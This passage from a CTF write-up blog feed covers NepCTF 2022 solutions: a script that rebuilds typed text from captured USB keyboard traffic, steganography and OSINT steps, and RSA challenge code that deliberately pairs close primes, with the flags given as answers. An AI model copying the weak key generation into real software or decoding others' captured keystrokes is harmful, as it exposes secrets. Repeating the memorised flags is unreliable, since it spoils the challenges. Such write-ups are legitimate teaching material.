class="number">79875848044631194160351918105738804229446748736206976033243436373010695259945613104837645712048695514204494137005015770637421510392760763371639480133851920449252506525423837434811693638210458851990502785655738042348115385964604080872180121543147063180945532713593712726527002909054818485584237993215139630243</span>,<span class="number">73100501797447180147684637554796375398455002202770022931512541062214916136294604754404667725341796896161398464327153718845280194035978972665664657052946003418121755545770123205426883869361411412259838522099085901563107814985172942977520233320215882707710717870398128412272218474014381169303848087621856187879</span>,<span class="number">89149546555397759430343098936690138982544367561661914051499112345535238108800665531588376806546499374457634397161670140520060064963391826220177798442707381640723248034061313974522233415815795656570220902974484865176728535660627712374835329967608728216749734529761431592345816592875807318876347151421393671763</span>,<span class="number">66449107450661172442868032153863675098235855689218695279414435182923510356012957155941548483160873271040452368644926703812707864779900715051152673705082002761445847561495295455460041902473282731259268870375921215589157288622757488879539441498396276257589120302991242300378364101246448094955634459779361686643</span>,<span class="number">79694880331320743031437708811856697413105291652061062223857313580221562305807771003185061831752133665835648647560103986928466217390444724672894866216636981793418219455653595717274553950715056120806463449033181486699963584346517910081706586345546292894426402568226579894766693070066214488743160957135286739213</span>,<span class="number">70521001788476157145543175674209083194325853388116385624440232036679708917857095748070597575068955423165296665429648694541353249787337464272095260410717659726012806836884799476995758902361678737968193674368688353935424186389207123637734230550266810766585903134004322848985320790788169777840924595645463787189</span>,<span class="number">51801430118171456966246071852561156183140136541960623661080056673664466785669585092926482194691254461430866302262960624015915371927788809661387318097968209364907625599562339722700041444342116899266802018340155635959614677597708758012024981583143521259152639480003228924151971208695043251548758407218187895663</span>,<span class="number">87310111118839703578797261862424304499548882114635944516216618095145194843718635007052242072452831460162126955481326379219639313067967998826898344673513019946299427614605216960081461930080199023399060417820769438661351988322185620598552697590115678078498754112860310272842870106790357443602405008865116282919</span>]</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">7552850543392291177573335134779451826968284497191536051874894984844023350777357739533061306212635723884437778881981836095720474943879388731913801454095897</span></span><br><span class="line">c = <span class="number">38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    q = <span class="built_in">int</span>(n[i]//p)</span><br><span class="line">    f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d = inverse_mod(e,f)</span><br><span class="line">    c = <span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n[i]))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(c)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;GWHT&#123;gixkJl7SJTcpLOL9zqwo&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Solomen’s-puzzle-1"><a href="#Solomen’s-puzzle-1" class="headerlink" title="Solomen’s puzzle 1"></a>Solomen’s puzzle 1</h3><blockquote><p>F1ower做梦梦见了Reed和Solomen，他们告诉了F1ower财富密码，但是F1ower记错了几个字节。。请将最终得到的完整flag(包含DASCTF{})进行MD5后再提交，即提交：`”DASCTF</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;大赛由中共广州市委网络安全和信息化委员会办公室作为指导单位，广州市网络安全产业促进会主办，广东外语外贸大学、杭州安恒信息技术股份有限公司承办，广州市信息安全测评中心、广州互联网协会协办。&lt;/p&gt;
&lt;p&gt;大赛以“网络安全为人民、网络安全靠人民”为主题</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>NepCTF 2022</title>
    <link href="https://lazzzaro.github.io/2022/07/17/match-NepCTF-2022/"/>
    <id>https://lazzzaro.github.io/2022/07/17/match-NepCTF-2022/</id>
    <published>2022-07-17T13:18:30.000Z</published>
    <updated>2022-07-17T16:14:32.991Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>“NepCTF 2022”是由Nepnep联合站队主办的公益招新赛事，旨在以有代表性、有特色的题目培养新生网络安全能力。</p><p>比赛时间：2022年7月15日10:00 - 2022年7月17日10:00。</p><p>比赛形式：个人解题赛</p><p>比赛链接：<a href="http://nep.lemonprefect.cn/">http://nep.lemonprefect.cn/</a></p><p>比赛平台：Power by CTFm</p><p>NepCTF 2022赛事说明文档：<a href="https://www.wolai.com/nepnep/4c2ZG1UaTnVMmyYsKB5duj">https://www.wolai.com/nepnep/4c2ZG1UaTnVMmyYsKB5duj</a></p><p><strong>Rank: 4</strong></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><blockquote><p>极限套娃</p><p>flag格式为nepctf{}</p></blockquote><p>jpg中提取出zip压缩包，zip压缩包套娃232层，用cyberchef label+jump循环提取出最内层的pcap文件；</p><p>wireshark打开发现为USB键盘流量，tshark工具提取出usb.capdata数据，用脚本还原键位：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;</span><br><span class="line"><span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>,</span><br><span class="line"><span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>,</span><br><span class="line"><span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>,</span><br><span class="line"> <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>,</span><br><span class="line">  <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>,</span><br><span class="line"><span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>,</span><br><span class="line"><span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,</span><br><span class="line"><span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,</span><br><span class="line"><span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,</span><br><span class="line"><span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;</span><br><span class="line"><span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>,</span><br><span class="line"><span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>,</span><br><span class="line"> <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>,</span><br><span class="line">  <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>,</span><br><span class="line"><span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>,</span><br><span class="line"><span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>,</span><br><span class="line"> <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,</span><br><span class="line"> <span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line"><span class="keyword">del</span> output[a]</span><br><span class="line"><span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">flag+=<span class="number">1</span></span><br><span class="line">output.pop(i)</span><br><span class="line"><span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">output[i]=output[i].upper()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure><p>得到 <code>welcometonepctf2nd</code>，加分隔符得flag：<code>nepctf&#123;welcome_to_nepctf_2nd&#125;</code>。</p><p>​    </p><h3 id="花花画画画花花"><a href="#花花画画画花花" class="headerlink" title="花花画画画花花"></a>花花画画画花花</h3><blockquote><p>花花画了一张图，你能看出来她画的是什么吗</p><p>(flag格式为NepCTF{})</p></blockquote><p>在 <a href="https://osu.ppy.sh/wiki/zh/Client/File_formats">osu! wiki</a> 可以发现osz文件为可执行的osu!谱面文件，下载安装osu!，</p><p>根据 <code>生成的 .osz 文件会被放置在 osu! 文件夹下的 &quot;Exports&quot; 文件夹里</code>，将osz文件放入 <code>Exports</code> 文件夹，打开osu!，</p><p>在Edit页面看完整首歌曲的乐谱轨迹，拿到flag：<code>NepCTF&#123;MASTER_OF_坏女人！&#125;</code>。</p><p>​    </p><h3 id="少见的bbbbase"><a href="#少见的bbbbase" class="headerlink" title="少见的bbbbase"></a>少见的bbbbase</h3><blockquote><p>少见的bbbbase</p></blockquote><p>尝试几种常见jpg隐写，发现是jphide隐写，用JPHS工具seek（无密码），得到 <code>KkYWdvCQcLYewSUUy5TtQc9AMa</code></p><p>base58解得flag：<code>flag&#123;Real_qiandao~&#125;</code>。</p><p>​    </p><h3 id="9点直播"><a href="#9点直播" class="headerlink" title="9点直播"></a>9点直播</h3><blockquote><p>各位同学，比赛已经开始将近十个小时啦，大家玩的如何呢？邀请大家9点来直播间聊聊天~ 请锁定<a href="https://b23.tv/bn0pPAR">https://b23.tv/bn0pPAR</a><br>这边小助手收到了大家想暴打出题人的反馈，今晚9点我们请到了变态的出题人们，在直播间和大家交流，放出我们的hint，帮助大家解题。<br>同时也会在直播间中抽幸运的小伙伴送出我们的周边礼品。</p></blockquote><p>看B站直播拿flag：<code>NepCTF&#123;bad_woman_nb!&#125;</code>。</p><p>​    </p><h3 id="馅饼？陷阱！"><a href="#馅饼？陷阱！" class="headerlink" title="馅饼？陷阱！"></a>馅饼？陷阱！</h3><blockquote><p>好兄弟中奖了，但是要先汇款。他去哪了？</p><p>NepCTF{银行官网网址}</p></blockquote><p>OSINT题。</p><p><img src="/2022/07/17/match-NepCTF-2022/image-20220717235016617.png" alt="image-20220717235016617"></p><p>用Yandex识别图1里的黄色建筑，可得到结果为<strong>豪威海景大酒店</strong>，再在百度地图里搜索在海南三亚，附近银行为<strong>光大银行</strong>，</p><p>官网网址即flag：<code>NepCTF&#123;www.cebbank.com&#125;</code>。</p><p>​    </p><h3 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h3><blockquote><p><a href="https://www.wjx.cn/vm/mjlLAVV.aspx">https://www.wjx.cn/vm/mjlLAVV.aspx</a></p></blockquote><p>答问卷暴打出题人，拿flag：<code>NepCTF&#123;see_you_NepCTF_2023&#125;</code>。</p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><blockquote><p>本题flag格式: NepCTF{xxx}</p><p>Have you heard of the Chinese Remainder Theorem?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getStrongPrime,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> powmod,is_prime,invert,bit_length, next_prime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>():</span><br><span class="line">    (p,q,n,e,d) = (<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">    p = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">    q = next_prime(p)</span><br><span class="line"></span><br><span class="line"><span class="comment">#     q = p + 1</span></span><br><span class="line"><span class="comment">#     while(True):</span></span><br><span class="line"><span class="comment">#         q += 2 if q &amp; 1 else 1</span></span><br><span class="line"><span class="comment">#         if is_prime(q, 30):</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"></span><br><span class="line">    n = p*q</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    par = (p,q,n,e,d)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> par</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">par, c</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(par) == <span class="number">5</span></span><br><span class="line">    (p,q,n,e,d) = par</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Here&#x27;s something for you.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>,e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c_mod_p =&quot;</span>,c % p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c_mod_q =&quot;</span>,c % q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">message, par</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(par) == <span class="number">5</span></span><br><span class="line">    (p,q,n,e,d) = par</span><br><span class="line"></span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line"></span><br><span class="line">    c = powmod(m,e,n)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    par = gen_key()</span><br><span class="line">    c = enc(flag, par)</span><br><span class="line">    leak(par, c)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span 